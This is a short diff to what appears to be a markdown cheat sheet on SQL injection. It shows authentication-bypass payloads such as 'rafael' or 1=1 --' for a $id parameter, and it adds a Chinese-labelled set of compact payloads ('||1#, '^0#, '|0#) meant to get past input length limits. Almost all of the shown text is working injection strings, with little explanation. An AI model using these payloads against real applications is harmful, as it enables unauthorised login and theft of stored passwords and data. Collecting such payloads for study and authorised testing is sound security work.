@@ -21,6 +21,11 @@ So, what can we insert into $id?
 
 rafael' or 1=1 --  // select password from users where name = 'rafael' or 1=1 --';  
 rafael' or ''='    // select password from users where name = 'rafael' or ''=''; 
+
+// 繞過長度限制
+'||1#     // 邏輯運算符不需要空白
+'^0#
+'|0#
 ```  
   
 ### Union based
